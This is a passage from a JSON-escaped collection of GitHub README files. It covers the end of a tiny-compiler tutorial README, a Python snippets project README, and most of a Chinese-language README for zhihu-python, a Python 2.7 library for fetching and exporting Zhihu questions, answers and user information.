compiler\nwritten in easy to read JavaScript.\n\nReading through the guided code will help you learn about how *most* compilers\nwork from end to end.\n\n### [Want to jump into the code? Click here](the-super-tiny-compiler.js)\n\n### [You can also check it out on Glitch](https:\/\/the-super-tiny-compiler.glitch.me\/)\n\n---\n\n### Why should I care?\n\nThat's fair, most people don't really have to think about compilers in their day\njobs. However, compilers are all around you, tons of the tools you use are based\non concepts borrowed from compilers.\n\n### But compilers are scary!\n\nYes, they are. But that's our fault (the people who write compilers), we've\ntaken something that is reasonably straightforward and made it so scary that\nmost think of it as this totally unapproachable thing that only the nerdiest of\nthe nerds are able to understand.\n\n### Okay so where do I begin?\n\nAwesome! Head on over to the [the-super-tiny-compiler.js](the-super-tiny-compiler.js)\nfile.\n\n### I'm back, that didn't make sense\n\nOuch, I'm really sorry. Let me know how it can be improved.\n\n### Tests\n\nRun with `node test.js`\n\n---\n\n[![cc-by-4.0](https:\/\/licensebuttons.net\/l\/by\/4.0\/80x15.png)](http:\/\/creativecommons.org\/licenses\/by\/4.0\/)\n"},{"repo":"\/30-seconds\/30-seconds-of-python","language":"Python","readme_contents":"[![Logo](\/logo.png)](https:\/\/30secondsofcode.org\/python\/p\/1)\n\n## 30 seconds of Python\n\n> Short Python code snippets for all your development needs\n\n* Visit [our website](https:\/\/30secondsofcode.org) to view our snippet collection.\n* Use the [Search page](https:\/\/30secondsofcode.org\/search) to find snippets that suit your needs. You can search by name, tag, language or using a snippet's description. Just start typing a term and see what comes up.\n* Browse the [Python Snippet List](https:\/\/30secondsofcode.org\/python\/p\/1) to see all the snippets in this project or click individual tags at the top of the same page to narrow down your search to a specific tag.\n* Click on each snippet card to view the whole snippet, including code, explanation and examples.\n* You can use the button on the right side of a snippet card to copy the code to clipboard.\n* If you like the project, give it a star. It means a lot to the people maintaining it.\n\n## Want to contribute?\n\n* If you want to help us improve, take a minute to read the [Contribution Guidelines](\/CONTRIBUTING.md) first.\n* Use the [Snippet Template](\/snippet_template.md) to add new snippets to the collection.\n* If you find a problem with a specific snippet, please [open an issue](https:\/\/github.com\/30-seconds\/30-seconds-of-python\/issues\/new).\n* If you find a problem with the website, please [report it in the web repository](https:\/\/github.com\/30-seconds\/30-seconds-web\/issues\/new).\n\n## Credits & Sponsors\n\n* This repository is maintained by the [30-seconds organization on GitHub](https:\/\/github.com\/30-seconds).\n* All snippets are licensed under the CC0-1.0 License, unless explicitly stated otherwise.\n* Logos, names and trademarks are not to be used without the explicit consent of the maintainers or owners of the 30 seconds GitHub organization.\n* Our website is powered by [Netlify](https:\/\/www.netlify.com\/), [Gatsby](https:\/\/www.gatsbyjs.org\/), [Travis CI](https:\/\/travis-ci.com\/) & [GitHub](https:\/\/github.com\/\n"},{"repo":"\/egrcc\/zhihu-python","language":"Python","readme_contents":"zhihu-python\uff1a\u83b7\u53d6\u77e5\u4e4e\u4fe1\u606f\n===============================\n\n**\u6ce8\u610f: \u672c\u9879\u76ee\u4e0d\u518d\u7ef4\u62a4\u66f4\u65b0\uff01**\n\n.. contents::\n\n\n\u4ecb\u7ecd\n----\n\nzhihu-python \u91c7\u7528 Python2.7 \u7f16\u5199\uff0c\u7528\u6765\u65b9\u4fbf\u5730\u83b7\u53d6\u77e5\u4e4e\u4e0a\u5404\u79cd\u5185\u5bb9\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u53ef\u4ee5\u65b9\u4fbf\u5730\u5c06\u7b54\u6848\u5907\u4efd\u5bfc\u51fa\u4e3a txt \u6216 markdown \u6587\u4ef6\u3002\u7531\u4e8e\u77e5\u4e4e\u5b98\u65b9\u76ee\u524d\u6ca1\u6709\u63d0\u4f9b api\uff0c\u6240\u4ee5\u6709\u4e86\u6b64\u9879\u76ee\u7684\u5b58\u5728\u3002\n\n\u4f7f\u7528 Python3 \u7684\u7c7b\u4f3c\u9879\u76ee\u53ef\u4ee5\u53c2\u89c1\uff1a`zhihu-py3 <https:\/\/github.com\/7sDream\/zhihu-py3>`_ \u3002\u4f7f\u7528 PHP \u7684\u7c7b\u4f3c\u9879\u76ee\u53ef\u4ee5\u53c2\u89c1\uff1a`zhihu-php <https:\/\/github.com\/ahonn\/zhihu-php>`_ \u3002\u4f7f\u7528 Go \u7684\u7c7b\u4f3c\u9879\u76ee\u53ef\u4ee5\u53c2\u89c1\uff1a`zhihu-go <https:\/\/github.com\/DeanThompson\/zhihu-go>`_ \u3002\n\n**\u6ce8: \u672c\u9879\u76ee\u4ee3\u7801\u5747\u5728 Ubuntu14.04 \u4e0a\u4f7f\u7528 python2.7.6 \u7f16\u5199\u548c\u6d4b\u8bd5\u901a\u8fc7\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u80fd\u5b58\u5728\u4e00\u5b9a\u95ee\u9898\u3002**\n\n\u83b7\u53d6\u67d0\u4e2a\u95ee\u9898\u4e0b\u7684\u5168\u90e8\u56de\u7b54\u5e76\u5bfc\u51fa\uff0c\u5f88\u7b80\u5355\uff1a\n\n.. code-block:: python\n\n    from zhihu import Question\n    \n    url = \"http:\/\/www.zhihu.com\/question\/24269892\"\n    question = Question(url)\n    answers = question.get_all_answers()\n    for answer in answers:\n        answer.to_txt()\n        answer.to_md()\n \n\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u65b0\u5efatext\uff0cmarkdown\u4e24\u4e2a\u6587\u4ef6\u5939\uff0c\u5e76\u5c06\u6240\u6709txt\u6587\u4ef6\u4fdd\u5b58\u5230text\u6587\u4ef6\u5939\uff0c\u6240\u6709markdown\u6587\u4ef6\u4fdd\u5b58\u5230markdown\u6587\u4ef6\u5939\u3002\n\n\u5907\u4efd\u67d0\u5927V\u7684\u5168\u90e8\u56de\u7b54\uff0c\u4e5f\u5f88\u7b80\u5355\uff1a\n\n.. code-block:: python\n    \n    from zhihu import User\n    \n    user_url = \"http:\/\/www.zhihu.com\/people\/jixin\"\n    user = User(user_url)\n    answers = user.get_answers()\n    for answer in answers:\n        answer.to_txt()\n        answer.to_md()\n        \n\u5bfc\u51fa\u7684markdown\uff0ctxt\u6587\u4ef6\u793a\u4f8b\u8bf7\u89c1\u8be5\u9879\u76ee\u7684markdown\uff0ctext\u6587\u4ef6\u5939\u3002\u5f53\u7136\uff0c\u60f3\u8981\u77e5\u9053\u67d0\u5927V\u5173\u6ce8\u4e86\u90a3\u4e9b\u4eba\uff0c\u63d0\u4e86\u4ec0\u4e48\u95ee\u9898\u4e5f\u4e0d\u5728\u8bdd\u4e0b\uff0c\u8be6\u60c5\u8bf7\u89c1\uff1a\u5feb\u901f\u5f00\u59cb\u3002        \n\n\n\n\u5feb\u901f\u5f00\u59cb\n---------\n\n\u51c6\u5907\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Tips** :\n\n1.  \u786e\u4fdd\u4f60\u7684\u7cfb\u7edf\u91cc\u9762\u5df2\u7ecf\u5b89\u88c5\u4e86 `Python2.7 <https:\/\/www.python.org\/>`_ \uff0c\u4e0d\u540c\u4f5c\u4e1a\u7cfb\u7edf\u5982\u4f55\u5b89\u88c5\u4e0d\u518d\u8d58\u8ff0\u3002\n2.  \u68c0\u67e5\u4f60\u7cfb\u7edf\u4e2d `python` \u548c `pip` \u7684\u7248\u672c, \u5982\u679c\u4e0d\u5c5e\u4e8e `python2.7` , \u8bf7\u5728\u6267\u884c\u4ee3\u7801\u8303\u4f8b\u65f6\uff0c\u81ea\u884c\u5c06 `python` \u548c `pip` \u5206\u522b\u66ff\u6362\u6210 `python2.7` \u548c `pip2` \u3002\n3.  \u786e\u4fdd\u4f60\u7684\u7cfb\u7edf\u4e2d\u5b89\u88c5\u4e86 `git` \u7a0b\u5e8f \u4ee5\u53ca `python-pip` \u3002\n\n\n**\u514b\u9686\u672c\u9879\u76ee**\n\n\n.. code:: bash\n\n  git clone git@github.com:egrcc\/zhihu-python.git\n  cd zhihu-python\n\n\n**\u89e3\u51b3\u4f9d\u8d56**\n\n* `Beautiful Soup 4 <http:\/\/www.crummy.com\/software\/BeautifulSoup\/>`_\n* `requests <https:\/\/github.com\/kennethreitz\/requests>`_\n* `html2text <https:\/\/github.com\/aaronsw\/html2text>`_\n* `termcolor <https:\/\/pypi.python.org\/pypi\/termcolor>`_\n* `lxml <https:\/\/github.com\/lxml\/lxml>`_\n\n.. code:: bash\n\n  sudo pip install -r requirements.txt\n\n\nor\n\n.. code:: bash\n\n  sudo pip2 install -r requirements.txt\n\n\n\n**\u767b\u5f55\u77e5\u4e4e**\n\n\n\u767b\u5f55 `\u77e5\u4e4e` \u751f\u6210\u8eab\u4efd\u4fe1\u606f, \u4fdd\u5b58\u5728\u5f53\u524d\u76ee\u5f55\u7684 `cookies` \u6587\u4ef6\u4e2d\u3002\n\n.. code:: bash\n  \n  python auth.py\n\n\n**\u6267\u884c\u6d4b\u8bd5**\n\n\n.. code:: bash\n\n  python test.py\n\n\u4e0d\u51fa\u610f\u5916\uff0c\u4e00\u5207\u5e94\u8be5\u5b8c\u7f8e\u8fd0\u884c :))\n\n\n\nQuestion\uff1a\u83b7\u53d6\u95ee\u9898\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nQuestion \u4ee3\u8868\u4e00\u4e2a\u95ee\u9898\uff0c\u5904\u7406\u77e5\u4e4e\u95ee\u9898\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a Question \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u95ee\u9898\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n\n    from zhihu import Question\n    \n    url = \"http:\/\/www.zhihu.com\/question\/24269892\"\n    question = Question(url)\n\n\u5f97\u5230 Question \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u95ee\u9898\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n\n    # -*- coding: utf-8 -*-\n    from zhihu import Question\n    \n    url = \"http:\/\/www.zhihu.com\/question\/24269892\"\n    question = Question(url)\n\n    # \u83b7\u53d6\u8be5\u95ee\u9898\u7684\u6807\u9898\n    title = question.get_title()\n    # \u83b7\u53d6\u8be5\u95ee\u9898\u7684\u8be6\u7ec6\u63cf\u8ff0\n    detail = question.get_detail()\n    # \u83b7\u53d6\u56de\u7b54\u4e2a\u6570\n    answers_num = question.get_answers_num()\n    # \u83b7\u53d6\u5173\u6ce8\u8be5\u95ee\u9898\u7684\u4eba\u6570\n    followers_num = question.get_followers_num()\n    # \u83b7\u53d6\u8be5\u95ee\u9898\u6240\u5c5e\u8bdd\u9898\n    topics = question.get_topics()\n    # \u83b7\u53d6\u8be5\u95ee\u9898\u88ab\u6d4f\u89c8\u6b21\u6570\n    visit_times = question.get_visit_times()\n    # \u83b7\u53d6\u6392\u540d\u7b2c\u4e00\u7684\u56de\u7b54\n    top_answer = question.get_top_answer()\n    # \u83b7\u53d6\u6392\u540d\u524d\u5341\u7684\u5341\u4e2a\u56de\u7b54\n    top_answers = question.get_top_i_answers(10)\n    # \u83b7\u53d6\u6240\u6709\u56de\u7b54\n    answers = question.get_all_answers()\n\n    print title  # \u8f93\u51fa\uff1a\u73b0\u5b9e\u53ef\u4ee5\u6709\u591a\u7f8e\u597d\uff1f\n    print detail\n    # \u8f93\u51fa\uff1a\n    # \u672c\u95ee\u9898\u76f8\u5bf9\u4e8e\u201c\u73b0\u5b9e\u53ef\u4ee5\u591a\u6b8b\u9177\uff1f\u4f20\u9001\u95e8\uff1a\u73b0\u5b9e\u53ef\u4ee5\u6709\u591a\u6b8b\u9177\uff1f\n    # \u9898\u4e3b\uff1a       \u6628\u5929\u770b\u4e86\u201c\u73b0\u5b9e\u53ef\u4ee5\u6709\u591a\u6b8b\u9177\u201c\u3002\u611f\u89c9\u4e0d\u592a\u597d\uff0c\u6240\u4ee5\u6211\n    # \u5f00\u4e86\u8fd9\u4e2a\u95ee\u9898\u4ee5\u76f8\u5bf9\u5e94\uff0c\u5e0c\u671b\u80fd\u591f\u201c\u4e2d\u548c\u4e00\u4e0b\u201c\u3002\u548c\u90a3\u4e2a\u95ee\u9898\u9898\u4e3b\u4e0d\u60f3\n    # \u628a\u5b83\u53d8\u6210\u201c\u6bd4\u60e8\u5927\u4f1a\u201c\u4e00\u6837\uff0c\u6211\u4e5f\u4e0d\u60f3\u628a\u8fd9\u4e2a\u53d8\u6210\u201c\u9e21\u6c64\u6545\u4e8b\u4f1a\u201c\uff0c\u6216\u8005\n    # \u662f\u201c\u6652\u5e78\u798f\u201c\u6bd4\u8d5b\u3002\u6240\u4ee5\u5927\u5bb6\u4ece\u201c\u73b0\u5b9e\uff0c\u5b9e\u9645\u201d\u7684\u89d2\u5ea6\u51fa\u53d1\uff0c\u8bb2\u8ff0\u81ea\u5df1\u7684\n    # \u7f8e\u597d\u6545\u4e8b\uff0c\u8ba9\u5927\u5bb6\u770b\u770b\u793e\u4f1a\u7684\u51b7\u548c\u6696\uff0c\u80fd\u66f4\u52a0\u8fa8\u8bc1\u5730\u770b\u5f85\u4e16\u754c\uff0c\u662f\u6b64\n    # \u9898\u548c\u5f7c\u9898\u5171\u540c\u7684\u201c\u5fc3\u613f\u201c\u5427\u3002\n    print answers_num  # \u8f93\u51fa\uff1a2441\n    print followers_num  # \u8f93\u51fa\uff1a26910\n    for topic in topics:\n        print topic,  # \u8f93\u51fa\uff1a\u60c5\u611f\u514b\u5236 \u73b0\u5b9e \u793e\u4f1a \u4e2a\u4eba\u7ecf\u5386\n    print visit_times  # \u8f93\u51fa: \u8be5\u95ee\u9898\u5f53\u524d\u88ab\u6d4f\u89c8\u7684\u6b21\u6570\n    print top_answer  \n    # \u8f93\u51fa\uff1a<zhihu.Answer instance at 0x7f8b6582d0e0>\n    # Answer\u7c7b\u5bf9\u8c61\n    print top_answers  \n    # \u8f93\u51fa\uff1a<generator object get_top_i_answers at 0x7fed676eb320>\n    # \u4ee3\u8868\u524d\u5341\u7684Answer\u7684\u751f\u6210\u5668\n    print answers  \n    # \u8f93\u51fa\uff1a<generator object get_all_answer at 0x7f8b66ba30a0>\n    # \u4ee3\u8868\u6240\u6709Answer\u7684\u751f\u6210\u5668\n\n   \nAnswer\uff1a\u83b7\u53d6\u7b54\u6848\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAnswer \u4ee3\u8868\u4e86\u4e00\u4e2a\u7b54\u6848\uff0c\u5904\u7406\u77e5\u4e4e\u7b54\u6848\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a Answer \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u7b54\u6848\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n\n    from zhihu import Answer\n    \n    answer_url = \"http:\/\/www.zhihu.com\/question\/24269892\/answer\/29960616\"\n    answer = Answer(answer_url)\n\n\u5f97\u5230 Answer \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u7b54\u6848\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n    \n    # -*- coding: utf-8 -*-\n    from zhihu import Answer\n    \n    answer_url = \"http:\/\/www.zhihu.com\/question\/24269892\/answer\/29960616\"\n    answer = Answer(answer_url)\n    # \u83b7\u53d6\u8be5\u7b54\u6848\u56de\u7b54\u7684\u95ee\u9898\n    question = answer.get_question()\n    # \u83b7\u53d6\u8be5\u7b54\u6848\u7684\u4f5c\u8005\n    author = answer.get_author()\n    # \u83b7\u53d6\u8be5\u7b54\u6848\u83b7\u5f97\u7684\u8d5e\u540c\u6570\n    upvote = answer.get_upvote()\n    # \u83b7\u53d6\u8be5\u7b54\u6848\u6240\u5c5e\u95ee\u9898\u88ab\u6d4f\u89c8\u6b21\u6570\n    visit_times = answer.get_visit_times()\n    # \u83b7\u53d6\u6240\u6709\u7ed9\u8be5\u7b54\u6848\u70b9\u8d5e\u7684\u7528\u6237\u4fe1\u606f\n    voters = answer.get_voters()\n    # \u628a\u7b54\u6848\u8f93\u51fa\u4e3atxt\u6587\u4ef6\n    answer.to_txt()\n    # \u628a\u7b54\u6848\u8f93\u51fa\u4e3amarkdown\u6587\u4ef6\n    answer.to_md()\n\n    print question\n    # <zhihu.Question instance at 0x7f0b25d13f80>\n    # \u4e00\u4e2aQuestion\u5bf9\u8c61\n    print question.get_title()  # \u8f93\u51fa\uff1a\u73b0\u5b9e\u53ef\u4ee5\u6709\u591a\u7f8e\u597d\uff1f\n    print author\n    # <zhihu.User instance at 0x7f0b25425b90>\n    # \u4e00\u4e2aUser\u5bf9\u8c61\n    print voters \n    # <generator object get_voters at 0x7f32fbe55730>\n    # \u4ee3\u8868\u6240\u6709\u8be5\u7b54\u6848\u70b9\u8d5e\u7684\u7528\u6237\u7684\u751f\u6210\u5668\n    print author.get_user_id()  # \u8f93\u51fa\uff1a\u7530\u6d69\n    print upvote  # \u8f93\u51fa\uff1a9320\n    print visit_times  # \u8f93\u51fa: \u6539\u7b54\u6848\u6240\u5c5e\u95ee\u9898\u88ab\u6d4f\u89c8\u6b21\u6570\n\n\nUser\uff1a\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUser \u4ee3\u8868\u4e00\u4e2a\u7528\u6237\uff0c\u5904\u7406\u7528\u6237\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a User \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u7528\u6237\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n    \n    from zhihu import User\n    \n    user_url = \"http:\/\/www.zhihu.com\/people\/jixin\"\n    user = User(user_url)\n\n\u5f97\u5230 User \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u7528\u6237\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n    \n    # -*- coding: utf-8 -*-\n    from zhihu import User\n    \n    user_url = \"http:\/\/www.zhihu.com\/people\/jixin\"\n    user = User(user_url)\n    # \u83b7\u53d6\u7528\u6237ID\n    user_id = user.get_user_id()\n    # \u83b7\u53d6\u7528\u6237\u6027\u522b\n    user_gender = user.get_gender()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u7684\u5173\u6ce8\u8005\u4eba\u6570\n    followers_num = user.get_followers_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\u6570\n    followees_num =user.get_followees_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u63d0\u95ee\u7684\u4e2a\u6570\n    asks_num = user.get_asks_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u56de\u7b54\u7684\u4e2a\u6570\n    answers_num = user.get_answers_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u6536\u85cf\u5939\u4e2a\u6570\n    collections_num = user.get_collections_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u83b7\u5f97\u7684\u8d5e\u540c\u6570\n    agree_num = user.get_agree_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u83b7\u5f97\u7684\u611f\u8c22\u6570\n    thanks_num = user.get_thanks_num()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u7684\u5934\u50cfurl\n    head_img_url = user.get_head_img_url()\n    \n    # \u83b7\u53d6\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\n    followees = user.get_followees()\n    # \u83b7\u53d6\u5173\u6ce8\u8be5\u7528\u6237\u7684\u4eba\n    followers = user.get_followers()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u63d0\u7684\u95ee\u9898\n    asks = user.get_asks()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u56de\u7b54\u7684\u95ee\u9898\u7684\u7b54\u6848\n    answers = user.get_answers()\n    # \u83b7\u53d6\u8be5\u7528\u6237\u7684\u6536\u85cf\u5939\n    collections = user.get_collections()\n    \n    print user_id # \u9ec4\u7ee7\u65b0\n    print followers_num # 614840\n    print followees_num # 8408\n    print asks_num # 1323\n    print answers_num # 786\n    print collections_num # 44\n    print agree_num # 46387\n    print thanks_num # 11477\n    print head_img_url  # https:\/\/pic2.zhimg.com\/0626f4164009f291b26a79d96c6962c5_l.jpg\n    \n    print followees\n    # <generator object get_followee at 0x7ffcac3af050>\n    # \u4ee3\u8868\u6240\u6709\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\u7684\u751f\u6210\u5668\u5bf9\u8c61\n    print followers\n    # <generator object get_follower at 0x7ffcac3af0f0>\n    # \u4ee3\u8868\u6240\u6709\u5173\u6ce8\u8be5\u7528\u6237\u7684\u4eba\u7684\u751f\u6210\u5668\u5bf9\u8c61\n    print asks\n    # <generator object get_ask at 0x7ffcab9db780>\n    # \u4ee3\u8868\u8be5\u7528\u6237\u63d0\u7684\u6240\u6709\u95ee\u9898\u7684\u751f\u6210\u5668\u5bf9\u8c61\n    print answers\n    # <generator object get_answer at 0x7ffcab9db7d0>\n    # \u4ee3\u8868\u8be5\u7528\u6237\u56de\u7b54\u7684\u6240\u6709\u95ee\u9898\u7684\u7b54\u6848\u7684\u751f\u6210\u5668\u5bf9\u8c61\n    print collections\n    # <generator object get_collection at 0x7ffcab9db820>\n    # \u4ee3\u8868\u8be5\u7528\u6237\u6536\u85cf\u5939\u7684\u751f\u6210\u5668\u5bf9\u8c61\n\n\nCollection\uff1a\u83b7\u53d6\u6536\u85cf\u5939\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nCollection \u4ee3\u8868\u4e00\u4e2a\u6536\u85cf\u5939\uff0c\u5904\u7406\u6536\u85cf\u5939\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a Collection \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u6536\u85cf\u5939\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n\n    from zhihu import Collection\n    \n    collection_url = \"http:\/\/www.zhihu.com\/collection\/36750683\"\n    collection = Collection(collection_url)\n\n\u5f97\u5230 Collection \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u6536\u85cf\u5939\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n    \n    # -*- coding: utf-8 -*-\n    from zhihu import Collection\n    \n    collection_url = \"http:\/\/www.zhihu.com\/collection\/36750683\"\n    collection = Collection(collection_url)\n    \n    # \u83b7\u53d6\u8be5\u6536\u85cf\u5939\u7684\u521b\u5efa\u8005\n    creator = collection.get_creator()\n    # \u83b7\u53d6\u8be5\u6536\u85cf\u5939\u7684\u540d\u5b57\n    name = collection.get_name()\n    # \u83b7\u53d6\u8be5\u6536\u85cf\u5939\u4e0b\u7684\u524d\u5341\u4e2a\u7b54\u6848\n    top_answers = collection.get_top_i_answers(10)\n    # \u83b7\u53d6\u8be5\u6536\u85cf\u5939\u4e0b\u7684\u6240\u6709\u7b54\u6848\n    answers = collection.get_all_answers()\n    \n    print creator \n    # <zhihu.User instance at 0x7fe1296f29e0>\n    # \u4e00\u4e2aUser\u5bf9\u8c61\n    print creator.get_user_id() # \u7a37\u9ecd\n    print name # \u7ed9\u4f60\u4e00\u4e2a\u4e0d\u540c\u7684\u89c6\u89d2\n    print top_answers\n    # <generator object get_top_i_answers at 0x7f378465dc80>\n    # \u4ee3\u8868\u524d\u5341\u4e2a\u7b54\u6848\u7684\u751f\u6210\u5668\u5bf9\u8c61\n    print answers \n    # <generator object get_all_answer at 0x7fe12a29b280>\n    # \u4ee3\u8868\u6240\u6709\u7b54\u6848\u7684\u751f\u6210\u5668\u5bf9\u8c61\n\n\nColumn\uff1a\u83b7\u53d6\u4e13\u680f\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nColumn \u4ee3\u8868\u4e00\u4e2a\u4e13\u680f\uff0c\u5904\u7406\u4e13\u680f\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a Column \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u4e13\u680f\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n\n    from zhihu import Column\n    \n    url = \"http:\/\/zhuanlan.zhihu.com\/daily\"\n    column = Column(url)\n\n\u5f97\u5230 Column \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u4e13\u680f\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n\n    # -*- coding: utf-8 -*-\n    from zhihu import Column\n    \n    url = \"http:\/\/zhuanlan.zhihu.com\/daily\"\n    column = Column(url)\n\n    # \u83b7\u53d6\u8be5\u4e13\u680f\u7684\u6807\u9898\n    title = column.get_title()\n    # \u83b7\u53d6\u8be5\u4e13\u680f\u7684\u63cf\u8ff0\n    description = column.get_description()\n    # \u83b7\u53d6\u8be5\u4e13\u680f\u7684\u4f5c\u8005\n    creator = column.get_creator()\n    # \u83b7\u53d6\u8be5\u4e13\u680f\u7684\u6587\u7ae0\u6570\n    posts_num = column.get_posts_num()\n    # \u83b7\u53d6\u8be5\u4e13\u680f\u7684\u6240\u6709\u6587\u7ae0\n    posts = column.get_all_posts()\n\n    print title  # \u8f93\u51fa\uff1a\u77e5\u4e4e\u65e5\u62a5\n    print description\n    # \u8f93\u51fa\uff1a\n    # \u77e5\u4e4e\u65e5\u62a5\u542f\u52a8\u753b\u9762\u63a5\u53d7\u6240\u6709\u6444\u5f71\u5e08\u670b\u53cb\u4eec\u7684\u6295\u7a3f\uff0c\u5c06\u4f5c\u54c1\u94fe\u63a5\n    #\uff08\u5982 Flickr\u3001LOFTER \u7b49\u7b49\uff09\uff0c\u53d1\u81f3\u90ae\u7bb1 qidong (at) zhihu.com\uff0c\n    # \u5e76\u9644\u4e0a\u60a8\u7684\u77e5\u4e4e\u4e2a\u4eba\u9875\u9762\u5730\u5740\u5373\u53ef\u3002\n    # \n    # \u8be6\u7ec6\u6295\u7a3f\u8981\u6c42: http:\/\/t.cn\/zQyEpN5\n\n    print creator  \n    # \u8f93\u51fa\uff1a<zhihu.User instance at 0x75e33eb8>\n    # User\u7c7b\u5bf9\u8c61\n    print posts_num # 150 \n    print posts\n    # \u8f93\u51fa\uff1a<generator object get_all_posts at 0x75e33bc0>\n    # Post\u7c7b\u5bf9\u8c61\n\n\nPost\uff1a\u83b7\u53d6\u4e13\u680f\u6587\u7ae0\u4fe1\u606f\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPost \u4ee3\u8868\u4e00\u4e2a\u4e13\u680f\u6587\u7ae0\uff0c\u5904\u7406\u4e13\u680f\u6587\u7ae0\u76f8\u5173\u64cd\u4f5c\u3002\u521b\u5efa\u4e00\u4e2a Post \u5bf9\u8c61\u9700\u4f20\u5165\u8be5\u6587\u7ae0\u7684 url \uff0c\u5982\uff1a\n\n.. code-block:: python\n\n    from zhihu import Post\n    \n    url = \"http:\/\/zhuanlan.zhihu.com\/p\/20235601\"\n    post = Post(url)\n\n\u5f97\u5230 Post \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u8be5\u6587\u7ae0\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a\n\n.. code-block:: python\n\n    # -*- coding: utf-8 -*-\n    from zhihu import Post\n    \n    url = \"http:\/\/zhuanlan.zhihu.com\/p\/20770968\"\n    post = Post(url)\n\n    # \u83b7\u53d6\u8be5\u6587\u7ae0\u7684\u6807\u9898\n    title = post.get_title()\n    # \u83b7\u53d6\u8be5\u6587\u7ae0\u7684\u5185\u5bb9\n    content = post.get_content()\n    # \u83b7\u53d6\u8be5\u6587\u7ae0\u7684\u4f5c\u8005\n    author = post.get_author()\n    # \u83b7\u53d6\u8be5\u6587\u7ae0\u7684\u6240\u5c5e\u4e13\u680f\n    column = post.get_column()\n    # \u83b7\u53d6\u8be5\u6587\u7ae0\u6240\u5c5e\u8bdd\u9898\n    topics = post.get_topics()\n\n    print title  # \u8f93\u51fa\uff1a\u591c\u8bfb\u4e66|\u56db\u6708\u5341\u4e5d\u65e5\n    print content\n    # \u8f93\u51fa\uff1a\n    # <p>\u5404\u4f4d\uff0c\u665a\u4e0a\u597d\u3002<br> ...\n    # ......\n    print author\n    # \u8f93\u51fa\uff1a <zhihu.User instance at 0x75ec0fd0>\n    for topic in topics:\n        print topic,  # \u8f93\u51fa\uff1a\u9605\u8bfb\n    print column  \n    # \u8f93\u51fa\uff1a<zhihu.Column instance at 0x75eb3eb8>\n    # Column\u7c7b\u5bf9\u8c61\n    \n\n\u7efc\u5408\u5b9e\u4f8b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\u5c06 Question \uff0c Answer \uff0c User \uff0c Collection \u7ed3\u5408\u8d77\u6765\u4f7f\u7528\u3002\u5b9e\u4f8b\u5982\u4e0b\uff1a\n\n.. code-block:: python\n\n    # -*- coding: utf-8 -*-\n    from zhihu import Question\n    from zhihu import Answer\n    from zhihu import User\n    from zhihu import Collection\n    \n    url = \"http:\/\/www.zhihu.com\/question\/24269892\"\n    question = Question(url)\n    # \u5f97\u5230\u6392\u540d\u7b2c\u4e00\u7684\u7b54\u6848\n    answer = question.get_top_answer()\n    # \u5f97\u5230\u6392\u540d\u7b2c\u4e00\u7684\u7b54\u6848\u7684\u4f5c\u8005\n    user = answer.get_author()\n    # \u5f97\u5230\u8be5\u4f5c\u8005\u56de\u7b54\u8fc7\u7684\u6240\u6709\u95ee\u9898\u7684\u7b54\u6848\n    user_answers = user.get_answers()\n    # 